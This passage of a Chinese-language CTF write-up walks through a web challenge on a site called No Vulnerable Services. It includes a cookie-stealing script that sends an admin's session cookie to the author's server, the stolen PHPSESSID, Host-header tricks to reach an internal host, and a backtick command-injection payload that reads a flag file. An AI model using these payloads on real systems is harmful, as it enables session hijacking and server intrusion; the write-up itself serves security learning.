    }
    });
    }
    });
一段时间后出现如下
    Failed to load http://188.xxx.xxx.xxx/cdn/main.mst: 
    No 'Access-Control-Allow-Origin' header is present on the requested resource. 
    Origin 'http://app.hm.vulnerable.services' is therefore not allowed access. 
    If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
    (index):1 Uncaught (in promise) TypeError: Failed to fetch
    Promise.then (async)
    (anonymous) @ blob:http://app.hm.vulnerable.services/2a2a5c2b-f0cb-4879-b216-7b408b57cc8d:16
意思就是说我们服务器的返回包需要有Access-Control-Allow-Origin这个字段，这样就很简单了，直接搜索如何返回头部添加，
默认的apache2好像稍微麻烦一点。
直接搜索头部加CORS的方法,使用如下python代码
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    try:
    # Python 3
    from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig
    import sys
    def test (*args):
    test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
    except ImportError: # Python 2
    from BaseHTTPServer import HTTPServer, test
    from SimpleHTTPServer import SimpleHTTPRequestHandler
    class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
    self.send_header('Access-Control-Allow-Origin', '*')
    SimpleHTTPRequestHandler.end_headers(self)
    if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer)
这里有一个坑,只有burp开着代理本地访问网页才能成功，如果走代理的话是访问不到的。
访问即得flag可以稍微等待一哈在访问题目
这个题做了好久，不过涨见识了,脑子是个好东西...
### No Vulnerable Services
    No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.
    Be #unhackable.
    http://no.vulnerable.services/
正常打开界面，主界面返回包的头部如下
    HTTP/1.1 200 OK
    Date: Wed, 03 Oct 2018 01:48:26 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Vary: Accept-Encoding
    X-Served-By: d8a50228.ip.no.vulnerable.services
    Content-Security-Policy: default-src 'none'; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ 'unsafe-inline'; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/
    Content-Length: 6943
    Connection: close
    Content-Type: text/html; charset=UTF-8
关注点在两个上
    X-Served-By: d8a50228.ip.no.vulnerable.services
    Content-Security-Policy:······
fuzz一波可以发现这里指代的应该是ip,我在这里解密
    d8a50228->216.165.2.40
尝试将这里改为我服务器的ip
    http://bcxxxxxxx.ip.no.vulnerable.services/
发现可以正常访问,显示了我服务器的主页。
再来看看CSP
Content-Security-Policy(CSP)的东西比较多，直接采用[谷歌的CSP检测工具检测](https://csp-evaluator.withgoogle.com/)
检测出如下问题
    High severity finding
     *error*
    ---    **script-src** 
    *   Host whitelists can frequently be bypassed. Consider using 'strict-dynamic' in combination with CSP nonces or hashes.
    ------    *.no.vulnerable.services
    *   No bypass found; make sure that this URL doesn't serve JSONP replies or Angular libraries.
    -------    https://www.google.com/
    *   www.google.com is known to host JSONP endpoints which allow to bypass this CSP.
    -------    https://www.gstatic.com/
    *   www.gstatic.com is known to host Angular libraries which allow to bypass this CSP.
    *
只有一个可以与网站交互的地方
    Get in touch
    Give us your email address and a description of your company and we'll reach out when we have capacity.
    [Your Email Address]
    [Tell us about your company]
    (Get Started)
如何使题目访问到我们的服务器就是一个值得思考的问题，最终采用如下方式
    PI:EMAIL
为了方便，这里采用一个简易的python服务器
    try:
    # Python 3
    from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig
    import sys
    def test (*args):
    test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
    except ImportError: # Python 2
    from BaseHTTPServer import HTTPServer, test
    from SimpleHTTPServer import SimpleHTTPRequestHandler
    class MyHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
    print(self.headers)
    SimpleHTTPRequestHandler.do_GET(self)
    if __name__ == '__main__':
    test(MyHandler, HTTPServer)
用来获取访问的头部，同时在服务器上放置如下脚本  
**cookie.js**
    var img = document.createElement("img");
    img.src = "http://bcxxxxxx.ip.no.vulnerable.services/?cookie=" + encodeURI(document.cookie);
    document.body.appendChild(img);
这里有一个坑点，就是得需要进行谷歌的人机验证，否则无法正常传输数据到网站那边，应该得fu强成功访问后，得到如下信息
    Thank you
    We'll review your application shortly and reach out when we have capacity.
同时服务器接收了如下信息
    216.165.2.40 - - [03/Oct/2018 12:33:56] "GET /cookie.js HTTP/1.1" 200 -    Host: bcxxxxxx.ip.no.vulnerable.services
    Connection: keep-alive
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 HeadlessChrome/69.0.3497.81 Safari/537.36
    Accept: image/webp,image/apng,image/*,*/*;q=0.8
    Referer: http://admin.no.vulnerable.services/review.php?id=2652
    Accept-Encoding: gzip, deflate
    216.165.2.40 - - [03/Oct/2018 12:33:57] "GET /?cookie=PHPSESSID=k0qfm8ptanuevpbu0shsjmohc9 HTTP/1.1" 200 -
在这里我们可以得到
    Safari浏览器
    admin.no.vulnerable.services/review.php?id=2652
    admin的cookie=PHPSESSID=k0qfm8ptanuevpbu0shsjmohc9
使用这个cookie访问`admin.no.vulnerable.services`
    NVS INTERNAL - Admin
    Current Visitors: 500
    Quick links:
      Support
      Load Balancers - BETA
**lb.php**
    Beta Loadbalancer Stats
    Online - HealthyOnline - Unhealthy  Offline
    216.165.2.4110.20.0.10
    10.20.0.11
    10.20.0.12
这里通过ip的方式大致推断216.165.2.41是一个代理服务器，直接访问是
    404 Not Found
    nginx/1.14.0 (Ubuntu)
`support.no.vulnerable.services`无法访问，猜测需要获取ip
    ping support.no.vulnerable.services
    正在 Ping support.no.vulnerable.services [172.16.2.5] 具有 32 字节的数据:
将ip转换为为16进制继续访问
    http://ac100205.no.vulnerable.services/
    无法访问此网站
    网址为 http://ac100205.no.vulnerable.services/ 的网页可能暂时无法连接，或者它已永久性地移动到了新网址。
然后就涉及到知识盲区了，看wp之后，震惊，没想到burp还有这种功能
之前的理解是Target就是Host，不过这里学到了，具体什么情况只可意会不可言传
    Target:support.no.vulnerable.services
    GET / HTTP/1.1
    Host: support.no.vulnerable.services
    GET / HTTP/1.1
    Host: ac100205.ip.no.vulnerable.services
什么也没有返回
Target:
    GET / HTTP/1.1
    Host: 216.165.2.41
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
    Accept-Encoding: gzip, deflate
    Connection: close
    --------------    response
    --------------    
    404 Not Found
    404 Not Found
    nginx/1.14.0 (Ubuntu)
    GET / HTTP/1.1
    Host:support.no.vulnerable.services
    ·······
    --------------    reponse
    --------------    Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.
    GET / HTTP/1.1
    Host: ac100205.ip.no.vulnerable.services
    ······
    --------------    response
    --------------    
    NVS INTERNAL - Support
    NVS Support
    General Debugging Steps
    Tell the customer to turn it off and back on again.
    Blame the customer for making a change.
    Use the tools below to check for networking issues.
    Tools
    Ping
刚开始测试的时候主界面没有出来，后来就好了
最后的paylaod
    GET /ping.php?dest=127.0.0.1`cat%20flag.txt` HTTP/1.1
    Host: ac100205.ip.no.vulnerable.services
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
    Accept-Encoding: gzip, deflate
    Connection: close
### 对题目的一点点思考
这里题目调用谷歌的api，而且有相应的域名，所以理论上部分信息应该是可以被谷歌搜索到的(纯属个人思考，有问题欢迎大师傅指出，多多交流)
    site:*.no.vulnerable.services
可以直接搜索到，不过需要登陆，但是提供了一些信息
    NVS INTERNAL - Login
而且看到子域名类的题目应该直接采用Seay的Layer子域名挖掘机
    admin--->216.165.2.40
    support--->172.16.2.5--->172.16.2.5 服务器响应时间过长.(说明存在,而且应该只能由类似域名访问）
    static--->216.165.2.40--->Forbidden
    ······(这里就不跑了，应该还有很多,默认字典十分强大+爆破组合)
这道题目可以直接收集到的域名和对应的ip地址，会方便很多，直接提供一个大局观的思考,更加方便的做题。
参考资料：